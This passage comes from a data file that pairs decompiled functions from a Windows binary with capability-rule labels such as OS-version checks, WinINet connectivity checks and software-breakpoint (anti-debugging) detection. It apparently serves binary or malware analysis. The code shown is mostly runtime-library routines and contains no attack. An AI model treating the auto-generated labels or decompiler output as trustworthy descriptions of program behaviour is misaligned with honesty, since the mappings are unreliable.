= *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00406d6b;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00406d5d;\n        goto code_r0x00406d2b;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00406d6b:\n    fcn.00405fff(unaff_EBX);\n    return;\n}\n",
        "token_count": 508
    },
    "00407c32": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00407c32(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x412058 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.00403568();\n    var_14h = 0;\n    if (*0x413548 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"USER32.DLL\");\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MessageBoxW\"), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x00407d8f;\n        *0x413548 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, \"GetActiveWindow\");\n        *0x41354c = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetLastActivePopup\");\n        *0x413550 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetUserObjectInformationW\");\n        *0x413558 = (*pcVar4)(uVar3);\n        if (*0x413558 != 0) {\n            uVar3 = (*pcVar6)(iVar1, \"GetProcessWindowStation\");\n            *0x413554 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x413554 == var_18h) || (*0x413558 == var_18h)) {\ncode_r0x00407d3e:\n        if ((((*0x41354c != var_18h) && (pcVar4 = (*pcVar6)(*0x41354c),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x413550 != var_18h && (pcVar4 = (*pcVar6)(*0x413550),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x413554);\n        pcVar5 = (*pcVar6)(*0x413558);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x00407d3e;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x413548);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x00407d8f:\n    fcn.00405fff(unaff_EBX);\n    return;\n}\n",
        "token_count": 916
    },
    "00407d9e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407d9e(int16_t *arg_8h, int32_t arg_ch, int16_t *arg_10h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uStack16;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        piVar3 = arg_8h;\n        if (arg_10h != NULL) {\n            do {\n                if (*piVar3 == 0) break;\n                piVar3 = piVar3 + 1;\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            if (arg_ch != 0) {\n                iVar4 = piVar3 - arg_10h;\n                do {\n                    iVar1 = *arg_10h;\n                    *(iVar4 + arg_10h) = iVar1;\n                    arg_10h = arg_10h + 1;\n                    if (iVar1 == 0) break;\n                    arg_ch = arg_ch + -1;\n                } while (arg_ch != 0);\n                if (arg_ch != 0) {\n                    return 0;\n                }\n                *arg_8h = 0;\n                puVar2 = fcn.00403a1e();\n                uStack16 = 0x22;\n                *puVar2 = 0x22;\n                goto code_r0x00407dbd;\n            }\n        }\n        *arg_8h = 0;\n    }\n    puVar2 = fcn.00403a1e();\n    uStack16 = 0x16;\n    *puVar2 = 0x16;\ncode_r0x00407dbd:\n    fcn.00403521();\n    return uStack16;\n}\n",
        "token_count": 404
    },
    "00408039": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408039(int32_t *arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t arg_10h;\n    \n    uVar3 = 0;\n    if (((arg_8h[3] & 3) == 2) && ((arg_8h[3] & 0x108U) != 0)) {\n        iVar1 = arg_8h[2];\n        iVar2 = *arg_8h - iVar1;\n        if (0 < iVar2) {\n            arg_10h = iVar2;\n            arg_8h_00 = fcn.00408222(arg_8h);\n            iVar1 = fcn.0040c645(arg_8h_00, iVar1, arg_10h);\n            if (iVar1 == iVar2) {\n                if (arg_8h[3] < '\\0') {\n                    arg_8h[3] = arg_8h[3] & 0xfffffffd;\n                }\n            }\n            else {\n                arg_8h[3] = arg_8h[3] | 0x20;\n                uVar3 = 0xffffffff;\n            }\n        }\n    }\n    arg_8h[1] = 0;\n    *arg_8h = arg_8h[2];\n    return uVar3;\n}\n",
        "token_count": 317
    },
    "0040851e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint16_t __cdecl fcn.0040851e(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.004023de(arg_ch);\n    uVar1 = *(*(var_10h + 200) + (arg_8h & 0xff) * 2);\n    if (var_4h != '\\0') {\n        *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n    }\n    return uVar1 & 0x8000;\n}\n",
        "token_count": 167
    },
    "00408605": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408605(char *arg_8h, int32_t arg_ch, char *arg_10h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint uStack16;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        pcVar3 = arg_8h;\n        if (arg_10h != NULL) {\n            do {\n                if (*pcVar3 == '\\0') break;\n                pcVar3 = pcVar3 + 1;\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            if (arg_ch != 0) {\n                iVar4 = pcVar3 - arg_10h;\n                do {\n                    cVar1 = *arg_10h;\n                    arg_10h[iVar4] = cVar1;\n                    arg_10h = arg_10h + 1;\n                    if (cVar1 == '\\0') break;\n                    arg_ch = arg_ch + -1;\n                } while (arg_ch != 0);\n                if (arg_ch != 0) {\n                    return 0;\n                }\n                *arg_8h = '\\0';\n                puVar2 = fcn.00403a1e();\n                uStack16 = 0x22;\n                *puVar2 = 0x22;\n                goto code_r0x00408624;\n            }\n        }\n        *arg_8h = '\\0';\n    }\n    puVar2 = fcn.00403a1e();\n    uStack16 = 0x16;\n    *puVar2 = 0x16;\ncode_r0x00408624:\n    fcn.00403521();\n    return uStack16;\n}\n",
        "token_count": 394
    },
    "00409a59": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.00409a59(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x412058 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = str.5_v_[1];\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = str.5_v_[0] + L'\\xffffffff';\n        iVar14 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x00409b9d;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x00409ba4;\ncode_r0x00409b9d:\n                        do {\n                            bVar6 = true;\ncode_r0x00409ba4:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x00409bb2;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x00409bb2:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x4128b4 - str.5_v_[0]) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x4128b4 < iVar14) {\n                if (iVar14 < *0x4128b0) {\n                    iVar14 = iVar14 + str.5_v_[3];\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = str.5_v_[3] + *0x4128b0;\n                }\n                goto code_r0x00409f5d;\n            }\n            iVar13 = *0x4128b4 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = str.5_v_[0] + L'\\xffffffff';\n            iVar13 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x00409d51;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x00409d51:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = str.5_v_[1] + L'\\x01' + (str.5_v_[1] + L'\\x01' >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x00409f5d:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = uVar15;\n    }\n    fcn.00405fff(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3268
    },
    "00409faa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.00409faa(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x412058 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = *0x4128d4;\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = *0x4128d0 + -1;\n        iVar14 = *0x4128d0 + (*0x4128d0 >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (*0x4128d0 & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0040a0ee;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0040a0f5;\ncode_r0x0040a0ee:\n                        do {\n                            bVar6 = true;\ncode_r0x0040a0f5:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0040a103;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0040a103:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x4128cc - *0x4128d0) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x4128cc < iVar14) {\n                if (iVar14 < *0x4128c8) {\n                    iVar14 = iVar14 + *0x4128dc;\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = *0x4128d4 + (*0x4128d4 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = *0x4128d4 + (*0x4128d4 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = *0x4128dc + *0x4128c8;\n                }\n                goto code_r0x0040a4ae;\n            }\n            iVar13 = *0x4128cc - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = *0x4128d0 + -1;\n            iVar13 = *0x4128d0 + (*0x4128d0 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (*0x4128d0 & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0040a2a2;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0040a2a2:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = *0x4128d4 + 1 + (*0x4128d4 + 1 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x0040a4ae:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x4128d8 == 0x40) {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (*0x4128d8 == 0x20) {\n        *arg_ch = uVar15;\n    }\n    fcn.00405fff(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3260
    },
    "0040bacc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040bacc(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    if (arg_8h < 0xffffffe1) {\n        do {\n            if (*0x413520 == 0) {\n                fcn.00404104();\n                fcn.00403f55(0x1e);\n                fcn.00401498(0xff);\n            }\n            uVar1 = arg_8h;\n            if (arg_8h == 0) {\n                uVar1 = 1;\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x413520, 0, uVar1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (*0x413890 == 0) {\n                puVar4 = fcn.00403a1e();\n                *puVar4 = 0xc;\n                break;\n            }\n            iVar3 = fcn.00403540(arg_8h);\n        } while (iVar3 != 0);\n        puVar4 = fcn.00403a1e();\n        *puVar4 = 0xc;\n    }\n    else {\n        fcn.00403540(arg_8h);\n        puVar4 = 